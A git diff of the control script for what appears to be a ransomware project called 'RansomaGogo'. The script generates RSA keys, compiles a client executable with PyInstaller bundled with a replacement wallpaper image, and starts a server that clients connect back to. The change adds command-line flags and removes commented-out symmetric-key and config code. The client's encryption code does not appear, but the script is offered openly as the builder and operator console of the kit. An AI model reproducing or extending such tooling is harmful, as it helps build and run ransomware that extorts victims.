@@ -5,6 +5,7 @@ import signal
 import sys
 import time
 import configparser
+import argparse
 from utils import resource_path
 from tqdm import tqdm
 from colorama import Fore, Style, init
@@ -16,12 +17,12 @@ from cryptography.hazmat.backends import default_backend
 init(autoreset=True)
 
 Ascii_Banner="""
-██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗ █████╗  ██████╗  ██████╗  ██████╗  ██████╗ 
+██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗ █████╗  ██████╗  ██████╗  ██████╗  ██████╗
 ██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║██╔══██╗██╔════╝ ██╔═══██╗██╔════╝ ██╔═══██╗
 ██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║███████║██║  ███╗██║   ██║██║  ███╗██║   ██║
 ██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║██╔══██║██║   ██║██║   ██║██║   ██║██║   ██║
 ██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║██║  ██║╚██████╔╝╚██████╔╝╚██████╔╝╚██████╔╝
-╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝  ╚═════╝                                                               
+╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝  ╚═════╝
 """
 
 def load_config():
@@ -68,14 +69,6 @@ def generate_rsa_keys():
     print(Fore.GREEN + "Clés RSA générées et sauvegardées avec succès.")
     return private_key, public_key
 
-""" def generate_symmetric_key():
-    print(Fore.CYAN + "Génération de la clé symétrique...")
-    symmetric_key = os.urandom(32)
-    with open(os.path.join('keys', 'symmetric_key.bin'), 'wb') as key_file:
-        key_file.write(symmetric_key)
-    print(Fore.GREEN + "Clé symétrique générée et sauvegardée avec succès.")
-    return symmetric_key """
-
 def compile_executable():
     print(Fore.CYAN + "Compilation de l'exécutable...")
     # Supprimer les dossier dist et build s'ils existent déjà
@@ -93,8 +86,7 @@ def compile_executable():
         '--add-data', 'utils.py:.',
         '--add-data', 'new_wallpaper.jpg:.',
         'client/main.py'
-    ], # stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-    
+    ],
     stdout=subprocess.PIPE, stderr=subprocess.PIPE
     )
 
@@ -102,7 +94,6 @@ def compile_executable():
     if process.returncode != 0:
         print(Fore.RED + "Erreur lors de la compilation :")
         print(stderr.decode())
-
 
     # Afficher une barre de progression pour simuler un chargement
     with tqdm(total=100, desc="Compilation en cours", colour="green") as pbar:
@@ -117,13 +108,6 @@ def compile_executable():
     print(Fore.CYAN + "L'exécutable a été généré à l'emplacement suivant : " + Fore.LIGHTMAGENTA_EX + f"{executable_path}")
 
 def start_server(server_ip, server_port, local_port):
-    """ print(Fore.CYAN + "Modification du fichier config.ini du serveur avec l'adresse et le port spécifiés...")
-    # Modifier le fichier config.ini du serveur avec l'adresse et le port spécifiés
-    with open('server/config.ini', 'w') as config_file:
-        config_file.write(f"SERVER_IP = '{server_ip}'\n")
-        config_file.write(f"SERVER_PORT = {server_port}\n")
-        config_file.write(f"SERVER_PORT = {server_port}\n") """
-
     # Lancer le serveur
     print(Fore.CYAN + f"Lancement du serveur sur le port local {local_port}...")
     server_process = subprocess.Popen(['python', 'server/app.py', '--port', str(local_port)])
@@ -139,34 +123,47 @@ def start_server(server_ip, server_port, local_port):
     server_process.wait()
 
 def main():
+    parser = argparse.ArgumentParser(description="Outil de gestion de serveur et de compilation.")
+    parser.add_argument('--start-server', action='store_true', help="Lancer uniquement le serveur.")
+    parser.add_argument('--compile', action='store_true', help="Créer uniquement l'exécutable.")
+    parser.add_argument('--generate-keys', action='store_true', help="Générer uniquement une paire de clés RSA.")
+
+    args = parser.parse_args()
+
     # Afficher la bannière ASCII
     print(Fore.LIGHTMAGENTA_EX + Ascii_Banner)
 
     # Charger la configuration
     config = load_config()
 
-    # Demander à l'utilisateur l'adresse IP et le numéro de port du serveur pour la connexion client
-    server_ip = input(Fore.CYAN + f"Veuillez entrer l'adresse IP du serveur pour la connexion client [{config['SERVER']['client_ip']}] : ") or config['SERVER']['client_ip']
-    server_port = input(Fore.CYAN + f"Veuillez entrer le numéro de port du serveur pour la connexion client [{config['SERVER']['client_port']}] : ") or config['SERVER']['client_port']
+    if args.start_server or args.compile or args.generate_keys:
+        # Demander à l'utilisateur l'adresse IP et le numéro de port du serveur pour la connexion client
+        server_ip = input(Fore.CYAN + f"Veuillez entrer l'adresse IP du serveur pour la connexion client [{config['SERVER']['client_ip']}] : ") or config['SERVER']['client_ip']
+        server_port = input(Fore.CYAN + f"Veuillez entrer le numéro de port du serveur pour la connexion client [{config['SERVER']['client_port']}] : ") or config['SERVER']['client_port']
 
-    # Demander à l'utilisateur le port local pour le serveur
-    local_port = input(Fore.CYAN + f"Veuillez entrer le numéro de port local pour le serveur [{config['SERVER']['local_port']}] : ") or config['SERVER']['local_port']
+        # Demander à l'utilisateur le port local pour le serveur
+        local_port = input(Fore.CYAN + f"Veuillez entrer le numéro de port local pour le serveur [{config['SERVER']['local_port']}] : ") or config['SERVER']['local_port']
 
-    # Mettre à jour la configuration avec les nouvelles valeurs
-    config['SERVER']['client_ip'] = server_ip
-    config['SERVER']['client_port'] = server_port
-    config['SERVER']['local_port'] = local_port
-    save_config(config)
+        # Mettre à jour la configuration avec les nouvelles valeurs
+        config['SERVER']['client_ip'] = server_ip
+        config['SERVER']['client_port'] = server_port
+        config['SERVER']['local_port'] = local_port
+        save_config(config)
 
-    # Générer les clés
-    generate_rsa_keys()
-    #generate_symmetric_key()
+    if args.generate_keys:
+        # Générer les clés
+        generate_rsa_keys()
 
-    # Compiler l'exécutable
-    compile_executable()
+    if args.compile:
+        # Compiler l'exécutable
+        compile_executable()
 
-    # Lancer le serveur
-    start_server(server_ip, server_port, local_port)
+    if args.start_server:
+        # Lancer le serveur
+        start_server(server_ip, server_port, local_port)
+
+    if not args.start_server and not args.compile and not args.generate_keys:
+        print(Fore.RED + "Veuillez spécifier une option : --start-server, --compile, ou --generate-keys")
 
 if __name__ == "__main__":
     main()
